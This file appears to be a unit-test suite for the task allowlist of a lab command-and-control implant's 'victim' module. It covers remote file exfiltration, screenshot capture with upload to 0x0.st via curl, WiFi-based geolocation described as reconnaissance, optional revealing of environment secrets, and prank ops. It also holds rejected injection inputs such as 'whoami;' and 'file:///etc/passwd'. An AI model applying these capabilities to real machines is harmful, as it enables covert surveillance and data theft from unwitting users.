// Unit tests for the mock task allowlist in src/victim/tasks.js.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { runTask, ALLOWED_OPS, FIND_MAX_RESULTS, HASH_MAX_BYTES } from '../src/victim/tasks.js';
import { OP_DEFS } from '../src/common/ops.js';

function tmpFile(contents, name = 'sample.txt') {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-tasks-'));
  const file = path.join(dir, name);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, contents);
  return { dir, file };
}

test('allowlist contains exactly the documented ops', () => {
  assert.deepEqual(
    [...ALLOWED_OPS].sort(),
    [
      'beep', 'bounce', 'cd', 'df', 'echo', 'env', 'find', 'geolocate', 'getfile', 'hash', 'ls',
      'netinfo', 'notify', 'openurl', 'party', 'ping', 'ps', 'pwd', 'rickroll',
      'say', 'screenshot', 'stat', 'sysinfo', 'time', 'volume', 'whoami',
    ],
  );
});

test('fun ops are categorized for help output', () => {
  assert.deepEqual(
    OP_DEFS.filter((op) => op.group === 'fun').map((op) => op.name),
    ['openurl', 'say', 'notify', 'beep', 'bounce', 'volume', 'rickroll', 'party'],
  );
  assert.deepEqual(
    OP_DEFS.filter((op) => op.group === 'screen').map((op) => op.name),
    ['screenshot'],
  );
  assert.equal(OP_DEFS.find((op) => op.name === 'geolocate')?.group, 'system');
});

// ---------------------------------------------------------------------------
// geolocate (gated; all scans/lookups use a fake process runner)
// ---------------------------------------------------------------------------

const AIRPORT_OUT = `
                            SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                        LabNet-5G  00:11:22:33:44:55 -52  149     Y  -- WPA2(PSK/AES/AES)
                    Coffeeshop WiFi  66:77:88:99:aa:bb -71  6       Y  -- WPA2(PSK/AES/AES)
`;
const NMCLI_OUT = `00\\:11\\:22\\:33\\:44\\:55:LabNet-5G:96
66\\:77\\:88\\:99\\:AA\\:BB:Coffee\\:Shop:58
`;
const NETSH_OUT = `
SSID 1 : LabNet-5G
    Network type            : Infrastructure
    BSSID 1                 : 00:11:22:33:44:55
         Signal             : 96%
SSID 2 : Coffeeshop
    BSSID 1                 : 66:77:88:99:aa:bb
         Signal             : 58%
`;
const WPS_RESPONSE = JSON.stringify({ location: { lat: 37.422, lng: -122.084 }, accuracy: 22 });

function fakeGeoRuntime(platform, { failScan = false, failLookup = false, extra = {} } = {}) {
  const calls = [];
  return {
    platform,
    enableGeolocate: true,
    calls,
    ...extra,
    execFileSync(file) {
      calls.push(file);
      const missing = () => Object.assign(new Error(`${file} unavailable`), { code: 'ENOENT' });
      if (platform === 'darwin' && file.includes('airport')) {
        if (failScan) throw missing();
        return AIRPORT_OUT;
      }
      if (platform === 'darwin' && file === 'system_profiler') throw missing();
      if (platform === 'linux' && file === 'nmcli') {
        if (failScan) throw missing();
        return NMCLI_OUT;
      }
      if (platform === 'win32' && file === 'netsh') {
        if (failScan) throw missing();
        return NETSH_OUT;
      }
      if (file === 'curl') {
        if (failLookup) throw new Error('curl: (7) connection refused');
        return WPS_RESPONSE;
      }
      throw new Error(`unexpected tool: ${file}`);
    },
  };
}

test('geolocate is disabled unless enableGeolocate is set', () => {
  for (const limits of [{}, { enableGeolocate: false }]) {
    const r = runTask('geolocate', {}, limits);
    assert.equal(r.ok, false);
    assert.match(r.error, /disabled/);
  }
});

test('geolocate scans WiFi BSSIDs per-OS in scan-only mode', () => {
  for (const platform of ['darwin', 'linux', 'win32']) {
    const runtime = fakeGeoRuntime(platform); // no geolocateServiceUrl configured
    const r = runTask('geolocate', {}, runtime);
    assert.equal(r.ok, true, `${platform}: ${r.error ?? ''}`);
    assert.match(r.output, /reconnaissance stage/);
    assert.match(r.output, /00:11:22:33:44:55/);
    assert.match(r.output, /66:77:88:99:aa:bb/); // normalized to lowercase
    assert.match(r.output, /LabNet-5G/);
  }
});

test('geolocate resolves coordinates with accuracy via the WPS service', () => {
  const runtime = fakeGeoRuntime('linux', {
    extra: {
      geolocateServiceUrl: 'https://wps.example.test/v1/geolocate',
      geolocateServiceKey: 'lab-key',
    },
  });
  const r = runTask('geolocate', {}, runtime);
  assert.equal(r.ok, true, r.error ?? '');
  assert.match(r.output, /wifi-scan \+ WPS database lookup/);
  assert.match(r.output, /lat=37\.422 lng=-122\.084 accuracyM=22/);
  assert.match(r.output, /service: wps\.example\.test/);
  assert.ok(runtime.calls.includes('curl'));
});

test('geolocate reports scan and lookup failures clearly', () => {
  const noScan = fakeGeoRuntime('darwin', { failScan: true });
  const r1 = runTask('geolocate', {}, noScan);
  assert.equal(r1.ok, false);
  assert.match(r1.error, /WiFi scan failed/);

  const badLookup = fakeGeoRuntime('linux', {
    failLookup: true,
    extra: { geolocateServiceUrl: 'https://wps.example.test/v1/geolocate' },
  });
  const r2 = runTask('geolocate', {}, badLookup);
  assert.equal(r2.ok, false);
  assert.match(r2.error, /connection refused/);
});

// ---------------------------------------------------------------------------
// screenshot (gated; all captures use a fake process runner)
// ---------------------------------------------------------------------------

const PNG_BYTES = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function fakeShotRuntime(platform, { failTools = false } = {}) {
  const calls = [];
  return {
    platform,
    enableScreenshot: true,
    calls,
    execFileSync(file, args) {
      calls.push({ file, args });
      if (failTools) {
        const err = new Error(`${file} unavailable`);
        err.code = 'ENOENT';
        throw err;
      }
      // The capture tool's output path is always the last argv element.
      fs.writeFileSync(args[args.length - 1], PNG_BYTES);
      return '';
    },
  };
}

test('screenshot is disabled unless enableScreenshot is set', () => {
  for (const limits of [{}, { enableScreenshot: false }]) {
    const r = runTask('screenshot', {}, limits);
    assert.equal(r.ok, false);
    assert.match(r.error, /disabled/);
  }
});

test('screenshot captures per-OS and transfers the PNG like getfile', () => {
  for (const platform of ['darwin', 'linux', 'win32']) {
    const runtime = fakeShotRuntime(platform);
    const r = runTask('screenshot', {}, runtime);
    assert.equal(r.ok, true, r.error ?? '');
    assert.equal(r.file.name, 'screenshot.png');
    assert.equal(r.file.size, PNG_BYTES.length);
    assert.deepEqual(Buffer.from(r.file.dataB64, 'base64'), PNG_BYTES);
    const tool = runtime.calls[0].file;
    assert.equal(
      tool,
      platform === 'darwin' ? 'screencapture'
        : platform === 'linux' ? 'import'
          : 'powershell.exe',
    );
  }
});

test('screenshot walks the downscale ladder when the PNG exceeds the cap, and reports missing tools', () => {
  // The fake "resizer" writes the same 8 bytes for every tool, so the ladder
  // exhausts and the task reports the floor failure.
  const small = { ...fakeShotRuntime('darwin'), maxFileBytes: 4 };
  const r1 = runTask('screenshot', {}, small);
  assert.equal(r1.ok, false);
  assert.match(r1.error, /does not fit the 4 byte cap/);

  const none = fakeShotRuntime('linux', { failTools: true });
  const r2 = runTask('screenshot', {}, none);
  assert.equal(r2.ok, false);
  assert.match(r2.error, /no screenshot tool/);
  assert.equal(none.calls.length, 3); // import, scrot, gnome-screenshot
});

// ---------------------------------------------------------------------------
// screenshot downscale-to-fit (fake capture writes a big PNG, fake resizer
// writes width-dependent JPEGs)
// ---------------------------------------------------------------------------

function fakeScaledShot(platform, { pngBytes = 60_000, jpegBytesForWidth = () => 12_000 } = {}) {
  const calls = [];
  const write = (p, n) => fs.writeFileSync(p, Buffer.alloc(n, 1));
  return {
    platform,
    enableScreenshot: true,
    maxFileBytes: 32 * 1024,
    calls,
    execFileSync(file, args) {
      calls.push({ file, args });
      if (file === 'screencapture' || file === 'import') return write(args.at(-1), pngBytes), '';
      if (file === 'sips') return write(args.at(-1), jpegBytesForWidth(Number(args[1]))), '';
      if (file === 'convert' || file === 'magick') {
        return write(args.at(-1), jpegBytesForWidth(Number.parseInt(args[2], 10))), '';
      }
      if (file === 'powershell.exe') {
        // capture script ends with the output path; resize script: src dest width q
        if (String(args[3]).includes('CopyFromScreen')) return write(args.at(-1), pngBytes), '';
        return write(args.at(-3), jpegBytesForWidth(Number(args.at(-2)))), '';
      }
      throw new Error(`unexpected tool: ${file}`);
    },
  };
}

test('screenshot downscales to a fitting JPEG with the per-OS resizer', () => {
  const expected = { darwin: 'sips', linux: 'convert', win32: 'powershell.exe' };
  for (const platform of ['darwin', 'linux', 'win32']) {
    const runtime = fakeScaledShot(platform);
    const r = runTask('screenshot', {}, runtime);
    assert.equal(r.ok, true, `${platform}: ${r.error ?? ''}`);
    assert.equal(r.file.name, 'screenshot.jpg');
    assert.equal(r.file.size, 12_000);
    assert.match(r.output, /JPEG downscaled to 1280px to fit the 32768-byte channel cap/);
    assert.equal(runtime.calls[1].file, expected[platform]);
  }
});

test('screenshot walks the width ladder until the JPEG fits', () => {
  const runtime = fakeScaledShot('darwin', { jpegBytesForWidth: (w) => w * 40 });
  // 1280px -> 51200 (too big), 960px -> 38400 (too big), 640px -> 25600 (fits)
  const r = runTask('screenshot', {}, runtime);
  assert.equal(r.ok, true, r.error ?? '');
  assert.match(r.output, /downscaled to 640px/);
  const sipsCalls = runtime.calls.filter((c) => c.file === 'sips');
  assert.deepEqual(sipsCalls.map((c) => c.args[1]), ['1280', '960', '640']);
});

test('screenshot fails clearly when even the floor exceeds the cap', () => {
  const runtime = fakeScaledShot('linux', { jpegBytesForWidth: () => 40_000 });
  const r = runTask('screenshot', {}, runtime);
  assert.equal(r.ok, false);
  assert.match(r.error, /does not fit the 32768 byte cap even as a 240px JPEG/);
});

test('screenshot honors and validates a per-task width override', () => {
  const runtime = fakeScaledShot('darwin');
  const r = runTask('screenshot', { width: 480 }, runtime);
  assert.equal(r.ok, true, r.error ?? '');
  assert.equal(runtime.calls[1].args[1], '480');

  for (const bad of [10, 8000, 1.5, 'big']) {
    const rt = fakeScaledShot('darwin');
    const res = runTask('screenshot', { width: bad }, rt);
    assert.equal(res.ok, false, `width ${bad} should be rejected`);
    assert.match(res.error, /width must be an integer from 160 to 7680/);
    assert.equal(rt.calls.length, 1); // capture happened, resize never did
  }
});

// ---------------------------------------------------------------------------
// screenshot exfil-by-reference (uploadUrl) mode
// ---------------------------------------------------------------------------

function fakeUploadShot(uploadResponse, { failUpload = false } = {}) {
  const runtime = fakeScaledShot('darwin', { pngBytes: 5_000_000 });
  runtime.uploadUrl = 'https://0x0.st';
  const baseExec = runtime.execFileSync;
  runtime.execFileSync = (file, args) => {
    if (file === 'curl') {
      runtime.calls.push({ file, args });
      if (failUpload) throw new Error('curl: (6) could not resolve host');
      return uploadResponse;
    }
    return baseExec(file, args);
  };
  return runtime;
}

test('screenshot uploads full-res and returns just the URL when uploadUrl is set', () => {
  for (const body of ['https://0x0.st/abc123.png\n', '{"success":true,"link":"https://file.io/xyz789"}']) {
    const runtime = fakeUploadShot(body);
    const r = runTask('screenshot', {}, runtime);
    assert.equal(r.ok, true, r.error ?? '');
    assert.equal(r.file, undefined); // no bytes cross the channel
    const expectedUrl = body.startsWith('http') ? body.trim() : 'https://file.io/xyz789';
    assert.match(r.output, new RegExp(expectedUrl.replace(/[./]/g, '\\$&')));
    assert.match(r.output, /full resolution/);
    assert.match(r.output, /anyone with this link can read the image/);
    const curl = runtime.calls.find((c) => c.file === 'curl');
    assert.ok(curl, 'curl was invoked');
    assert.match(curl.args.join(' '), /-F file=@/);
    assert.equal(runtime.calls.some((c) => c.file === 'sips'), false); // no downscale needed
  }
});

test('screenshot falls back to channel transfer when the upload fails', () => {
  const runtime = fakeUploadShot(null, { failUpload: true });
  const r = runTask('screenshot', {}, runtime);
  assert.equal(r.ok, true, r.error ?? '');
  assert.equal(r.file.name, 'screenshot.jpg');
  assert.match(r.output, /upload to 0x0\.st failed \(curl: \(6\) could not resolve host\)/);
  assert.match(r.output, /fell back to channel transfer/);
});

test('screenshot falls back when the upload response has no usable URL', () => {
  const runtime = fakeUploadShot('{"success":false,"error":"banned filetype"}');
  const r = runTask('screenshot', {}, runtime);
  assert.equal(r.ok, true, r.error ?? '');
  assert.equal(r.file.name, 'screenshot.jpg');
  assert.match(r.output, /no usable URL/);
});

test('unknown op is rejected, never executed', () => {
  const r = runTask('whoami;', {});
  assert.equal(r.ok, false);
  assert.match(r.error, /unknown or disallowed op/);
  const r2 = runTask('exec', { cmd: 'id' });
  assert.equal(r2.ok, false);
});

test('fun ops are disabled when the runtime does not explicitly enable them', () => {
  const result = runTask('beep', {}, { enableFunOps: false });
  assert.equal(result.ok, false);
  assert.match(result.error, /disabled/);
});

test('path ops resolve absolute and cwd-relative paths via realpath', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-root-'));
  fs.writeFileSync(path.join(dir, 'inside.txt'), 'inside');
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-outside-'));
  fs.writeFileSync(path.join(outside, 'other.txt'), 'outside');
  if (process.platform !== 'win32') {
    fs.symlinkSync(path.join(outside, 'other.txt'), path.join(dir, 'link.txt'));
  }

  assert.equal(runTask('hash', { path: path.join(dir, 'inside.txt') }).ok, true);
  // No filesystem root: any readable absolute path is fair game.
  assert.equal(runTask('hash', { path: path.join(outside, 'other.txt') }).ok, true);
  if (process.platform !== 'win32') {
    const r = runTask('stat', { path: path.join(dir, 'link.txt') });
    assert.equal(r.ok, true);
    assert.match(r.output, new RegExp(outside.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
  }
});

test('whoami returns identity info', () => {
  const r = runTask('whoami', {});
  assert.equal(r.ok, true);
  assert.match(r.output, /user=/);
  assert.match(r.output, /hostname=/);
  assert.match(r.output, /node=v/);
});

// ---------------------------------------------------------------------------
// pwd / cd / ls / stat / hash
// ---------------------------------------------------------------------------

test('pwd returns the current working directory', () => {
  const r = runTask('pwd');
  assert.deepEqual(r, { ok: true, output: process.cwd() });
});

test('cd changes cwd and later relative paths follow it', () => {
  const original = process.cwd();
  const { dir } = tmpFile('follow me\n');
  const realDir = fs.realpathSync(dir); // process.cwd() resolves symlinks (macOS /var -> /private/var)
  try {
    const r = runTask('cd', { path: dir });
    assert.deepEqual(r, { ok: true, output: realDir });

    const r2 = runTask('pwd');
    assert.equal(r2.output, realDir);

    // relative getfile now resolves against the new cwd
    const r3 = runTask('getfile', { path: 'sample.txt' });
    assert.equal(r3.ok, true);
    assert.equal(Buffer.from(r3.file.dataB64, 'base64').toString('utf8'), 'follow me\n');
  } finally {
    process.chdir(original);
  }
});

test('cd rejects files and missing paths', () => {
  const { file } = tmpFile('x');
  const r = runTask('cd', { path: file });
  assert.equal(r.ok, false);
  assert.match(r.error, /not a directory/);
  const r2 = runTask('cd', {});
  assert.equal(r2.ok, false);
  assert.match(r2.error, /failed/);
});

test('ls lists a directory with type and size', () => {
  const { dir } = tmpFile('list me\n');
  fs.mkdirSync(path.join(dir, 'subdir'));
  const r = runTask('ls', { path: dir });
  assert.equal(r.ok, true);
  assert.match(r.output, /2 entries/);
  assert.match(r.output, /file\s+\d+ sample\.txt/);
  assert.match(r.output, /dir\s+\d+ subdir/);
});

test('ls rejects a regular file', () => {
  const { file } = tmpFile('x');
  const r = runTask('ls', { path: file });
  assert.equal(r.ok, false);
  assert.match(r.error, /not a directory/);
});

test('stat reports metadata', () => {
  const { file } = tmpFile('stat me\n');
  const r = runTask('stat', { path: file });
  assert.equal(r.ok, true);
  assert.match(r.output, /type=file/);
  assert.match(r.output, /size=8/);
  assert.match(r.output, /mtime=/);
});

test('hash returns the sha256 of a file', () => {
  const contents = 'hash me\n';
  const { file } = tmpFile(contents);
  const r = runTask('hash', { path: file });
  assert.equal(r.ok, true);
  const expected = crypto.createHash('sha256').update(contents).digest('hex');
  assert.match(r.output, new RegExp(`sha256 ${expected}`));
});

test('hash rejects files above the size cap', () => {
  const { file } = tmpFile('');
  fs.truncateSync(file, HASH_MAX_BYTES + 1); // sparse file: no real I/O
  const r = runTask('hash', { path: file });
  assert.equal(r.ok, false);
  assert.match(r.error, /too large to hash/);
});

// ---------------------------------------------------------------------------
// env / netinfo / ps / df / find
// ---------------------------------------------------------------------------

test('env lists variable names but never exposes values', () => {
  process.env.NPM_C2_TEST_VISIBLE = 'visible-value';
  process.env.NPM_C2_TEST_API_TOKEN = 'super-secret';
  process.env.DATABASE_URL = 'postgres://admin:password@example.test/db';
  process.env.SESSION_COOKIE = 'session-value';
  try {
    const r = runTask('env');
    assert.equal(r.ok, true);
    assert.match(r.output, /NPM_C2_TEST_VISIBLE=<redacted>/);
    assert.match(r.output, /NPM_C2_TEST_API_TOKEN=<redacted>/);
    assert.match(r.output, /DATABASE_URL=<redacted>/);
    assert.match(r.output, /SESSION_COOKIE=<redacted>/);
    assert.doesNotMatch(r.output, /visible-value|super-secret|postgres:\/\/|session-value/);
  } finally {
    delete process.env.NPM_C2_TEST_VISIBLE;
    delete process.env.NPM_C2_TEST_API_TOKEN;
    delete process.env.DATABASE_URL;
    delete process.env.SESSION_COOKIE;
  }
});

test('env returns real values only when revealEnv is enabled', () => {
  process.env.NPM_C2_TEST_VISIBLE = 'visible-value';
  process.env.NPM_C2_TEST_API_TOKEN = 'super-secret';
  try {
    const revealed = runTask('env', {}, { revealEnv: true });
    assert.equal(revealed.ok, true);
    assert.match(revealed.output, /NPM_C2_TEST_VISIBLE=visible-value/);
    assert.match(revealed.output, /NPM_C2_TEST_API_TOKEN=super-secret/);

    // explicit false and absent flag behave like the default: redacted
    for (const limits of [{ revealEnv: false }, {}]) {
      const r = runTask('env', {}, limits);
      assert.equal(r.ok, true);
      assert.match(r.output, /NPM_C2_TEST_VISIBLE=<redacted>/);
      assert.doesNotMatch(r.output, /visible-value|super-secret/);
    }
  } finally {
    delete process.env.NPM_C2_TEST_VISIBLE;
    delete process.env.NPM_C2_TEST_API_TOKEN;
  }
});

test('netinfo lists at least one interface address', () => {
  const r = runTask('netinfo');
  assert.equal(r.ok, true);
  assert.match(r.output, /127\.0\.0\.1|::1|IPv4|IPv6/);
});

test('ps lists processes through the native Unix adapter', { skip: process.platform === 'win32' }, () => {
  const r = runTask('ps');
  assert.equal(r.ok, true);
  assert.match(r.output, /PID\s+PPID\s+%CPU\s+%MEM/);
  assert.match(r.output, /\n\s*\d+\s+\d+\s+[\d.]+\s+[\d.]+ /); // at least one process row
});

test('df reports filesystem usage through the native Unix adapter', { skip: process.platform === 'win32' }, () => {
  const r = runTask('df');
  assert.equal(r.ok, true);
  assert.match(r.output, /Filesystem/);
});

test('find locates files by name substring, recursively', () => {
  const { dir } = tmpFile('needle content\n', 'needle-data.txt');
  fs.mkdirSync(path.join(dir, 'nested'));
  fs.writeFileSync(path.join(dir, 'nested', 'another-needle.log'), 'x');
  fs.writeFileSync(path.join(dir, 'haystack.txt'), 'y');

  const r = runTask('find', { path: dir, query: 'needle' });
  assert.equal(r.ok, true);
  assert.match(r.output, /2 match/);
  assert.match(r.output, /needle-data\.txt/);
  assert.match(r.output, /another-needle\.log/);
  assert.doesNotMatch(r.output, /haystack\.txt/);
});

test('find validates its arguments', () => {
  const { file } = tmpFile('x');
  const r = runTask('find', { path: file, query: 'x' });
  assert.equal(r.ok, false);
  assert.match(r.error, /not a directory/);
  const r2 = runTask('find', { path: '/tmp' });
  assert.equal(r2.ok, false);
  assert.match(r2.error, /requires a name query/);
});

test('find truncates results at the cap', () => {
  const { dir } = tmpFile('x');
  for (let i = 0; i < FIND_MAX_RESULTS + 1; i++) {
    fs.writeFileSync(path.join(dir, `match-${String(i).padStart(3, '0')}.txt`), 'x');
  }
  const r = runTask('find', { path: dir, query: 'match-' });
  assert.equal(r.ok, true);
  assert.match(r.output, new RegExp(`${FIND_MAX_RESULTS}\\+ match`));
});

// ---------------------------------------------------------------------------
// getfile
// ---------------------------------------------------------------------------

test('getfile round-trips a small file as base64 (absolute path)', () => {
  const contents = 'hello c2 channel\n';
  const { file } = tmpFile(contents);
  const r = runTask('getfile', { path: file });
  assert.equal(r.ok, true);
  assert.equal(r.file.name, 'sample.txt');
  assert.equal(r.file.size, contents.length);
  assert.equal(Buffer.from(r.file.dataB64, 'base64').toString('utf8'), contents);
});

test('getfile handles binary data', () => {
  const bytes = Buffer.from([0, 1, 2, 255, 254, 13, 10]);
  const { file } = tmpFile(bytes, 'bin.dat');
  const r = runTask('getfile', { path: file });
  assert.equal(r.ok, true);
  assert.deepEqual(Buffer.from(r.file.dataB64, 'base64'), bytes);
});

test('getfile enforces the size cap', () => {
  const { file } = tmpFile(Buffer.alloc(2048, 65));
  const r = runTask('getfile', { path: file }, { maxFileBytes: 1024 });
  assert.equal(r.ok, false);
  assert.match(r.error, /too large/);
});

test('getfile reports missing files and missing path arg', () => {
  const { dir } = tmpFile('x');
  const r = runTask('getfile', { path: path.join(dir, 'missing.txt') });
  assert.equal(r.ok, false);
  assert.match(r.error, /failed/);
  const r2 = runTask('getfile', {});
  assert.equal(r2.ok, false);
  assert.match(r2.error, /requires args\.path/);
});

test('getfile rejects directories', () => {
  const { dir } = tmpFile('x');
  const r = runTask('getfile', { path: dir });
  assert.equal(r.ok, false);
  assert.match(r.error, /not a regular file/);
});

// ---------------------------------------------------------------------------
// fun desktop ops (all effects use a fake process runner)
// ---------------------------------------------------------------------------

function fakeRuntime(platform, fail = new Set()) {
  const calls = [];
  const bells = [];
  return {
    platform,
    calls,
    bells,
    execFileSync(file, args, options) {
      calls.push({ file, args, options });
      if (fail.has(file)) {
        const err = new Error(`${file} unavailable`);
        err.code = 'ENOENT';
        throw err;
      }
      return '';
    },
    writeBell(value) {
      bells.push(value);
    },
  };
}

test('ps and df use Windows PowerShell adapters', () => {
  for (const op of ['ps', 'df']) {
    const runtime = fakeRuntime('win32');
    const result = runTask(op, {}, runtime);
    assert.equal(result.ok, true, result.error ?? '');
    assert.equal(runtime.calls[0].file, 'powershell.exe');
  }
});

test('openurl accepts only http(s) and uses safe per-OS launchers', () => {
  const expected = {
    darwin: ['open', ['https://example.com/path?q=1']],
    linux: ['xdg-open', ['https://example.com/path?q=1']],
    win32: ['rundll32.exe', ['url.dll,FileProtocolHandler', 'https://example.com/path?q=1']],
  };
  for (const [platform, [file, args]] of Object.entries(expected)) {
    const runtime = fakeRuntime(platform);
    const result = runTask('openurl', { url: 'https://example.com/path?q=1' }, runtime);
    assert.equal(result.ok, true);
    assert.deepEqual([runtime.calls[0].file, runtime.calls[0].args], [file, args]);
  }

  const runtime = fakeRuntime('darwin');
  for (const url of ['file:///etc/passwd', 'javascript:alert(1)', 'not-a-url']) {
    const result = runTask('openurl', { url }, runtime);
    assert.equal(result.ok, false);
  }
  assert.equal(runtime.calls.length, 0);
});

test('say validates text length and maps to each OS without interpolation', () => {
  for (const platform of ['darwin', 'linux', 'win32']) {
    const runtime = fakeRuntime(platform);
    const result = runTask('say', { text: 'hello; "quoted"' }, runtime);
    assert.equal(result.ok, true);
    assert.equal(runtime.calls.length, 1);
    if (platform === 'darwin') assert.equal(runtime.calls[0].args.at(-1), 'hello; "quoted"');
    if (platform === 'linux') assert.deepEqual(runtime.calls[0].args, ['hello; "quoted"']);
    if (platform === 'win32') assert.doesNotMatch(runtime.calls[0].args[4], /hello|quoted/);
  }

  assert.equal(runTask('say', { text: '' }, fakeRuntime('darwin')).ok, false);
  assert.equal(runTask('say', { text: 'x'.repeat(201) }, fakeRuntime('darwin')).ok, false);
});

test('notify, beep, bounce, and volume have implementations for all three OS families', () => {
  for (const platform of ['darwin', 'linux', 'win32']) {
    for (const [op, args] of [
      ['notify', { text: 'hello "quoted"' }],
      ['beep', {}],
      ['bounce', {}],
      ['volume', { level: 42 }],
    ]) {
      const runtime = fakeRuntime(platform);
      const result = runTask(op, args, runtime);
      assert.equal(result.ok, true, `${platform} ${op}: ${result.error ?? ''}`);
      assert.ok(runtime.calls.length > 0 || runtime.bells.length > 0, `${platform} ${op} did nothing`);
    }
  }
});

test('volume rejects values outside 0-100', () => {
  for (const level of [-1, 101, 1.5, 'loud']) {
    const runtime = fakeRuntime('darwin');
    assert.equal(runTask('volume', { level }, runtime).ok, false);
    assert.equal(runtime.calls.length, 0);
  }
});

test('volume does not force unmute outside rickroll', () => {
  const mac = fakeRuntime('darwin');
  const linux = fakeRuntime('linux');
  runTask('volume', { level: 42 }, mac);
  runTask('volume', { level: 42 }, linux);
  assert.equal(mac.calls[0].args.includes('set volume output muted false'), false);
  assert.equal(linux.calls[0].args[0], 'set-volume');
});

test('Linux desktop utilities use fallbacks without invoking a shell', () => {
  const sayRuntime = fakeRuntime('linux', new Set(['spd-say']));
  assert.equal(runTask('say', { text: 'fallback' }, sayRuntime).ok, true);
  assert.deepEqual(sayRuntime.calls.map((c) => c.file), ['spd-say', 'espeak']);

  const beepRuntime = fakeRuntime('linux', new Set(['paplay', 'canberra-gtk-play', 'beep']));
  assert.equal(runTask('beep', {}, beepRuntime).ok, true);
  assert.deepEqual(beepRuntime.bells, ['\u0007']);
});

test('rickroll unmutes, raises volume, and requests best-effort foreground autoplay', () => {
  for (const platform of ['darwin', 'linux', 'win32']) {
    const runtime = fakeRuntime(platform);
    const result = runTask('rickroll', {}, runtime);
    assert.equal(result.ok, true);
    const files = runtime.calls.map((c) => c.file);
    const opener = platform === 'darwin' ? 'open' : platform === 'linux' ? 'xdg-open' : 'powershell.exe';
    assert.equal(files.at(-1), opener);
    assert.match(runtime.calls.at(-1).args.at(-1), /youtube\.com\/watch.*autoplay=1/);

    if (platform === 'darwin') {
      assert.deepEqual(runtime.calls[0].args, ['-e', 'set volume output muted false']);
    } else if (platform === 'linux') {
      assert.deepEqual(runtime.calls[0].args, ['set-mute', '@DEFAULT_AUDIO_SINK@', '0']);
    } else {
      assert.match(runtime.calls[0].args[3], /\[LabVolume\]::Tap\(175\);/);
      assert.equal(runtime.calls.length, 3);
      assert.match(runtime.calls.at(-1).args[3], /Start-Process.*WindowStyle Maximized/);
    }
  }
});

test('party combines beep, notification, and URL launch in one task', () => {
  const runtime = fakeRuntime('darwin');
  const result = runTask('party', {}, runtime);
  assert.equal(result.ok, true);
  assert.deepEqual(runtime.calls.map((c) => c.file), ['afplay', 'osascript', 'open']);
});
